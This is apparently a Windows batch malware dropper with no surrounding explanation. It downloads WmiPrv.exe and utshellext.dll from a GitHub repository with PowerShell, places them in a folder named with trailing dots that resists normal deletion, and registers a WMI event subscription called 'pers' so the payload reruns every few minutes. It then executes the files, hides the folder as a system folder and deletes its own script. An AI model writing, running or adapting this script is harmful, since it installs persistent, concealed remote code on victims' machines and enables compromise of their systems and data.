@echo off
mkdir C:\ProgramData\Packag
mkdir \\.\C:\ProgramData\Package..\
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="pers"", Consumer="CommandLineEventConsumer.Name="pers""
powershell.exe iwr https://github.com/wazgame/waz/raw/main/WmiPrv.exe -o C:\ProgramData\Packag\WmiPrv.exe
powershell.exe iwr https://github.com/wazgame/waz/raw/main/utshellext.dll -o C:\ProgramData\Packag\utshellext.dll
copy C:\ProgramData\Packag\WmiPrv.exe \\.\C:\ProgramData\Package..\WmiPrv.exe
copy C:\ProgramData\Packag\utshellext.dll \\.\C:\ProgramData\Package..\utshellext.dll
C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\utshellext.dll
attrib +h +s +r C:\ProgramData\Packag
del/a/f "%~f0"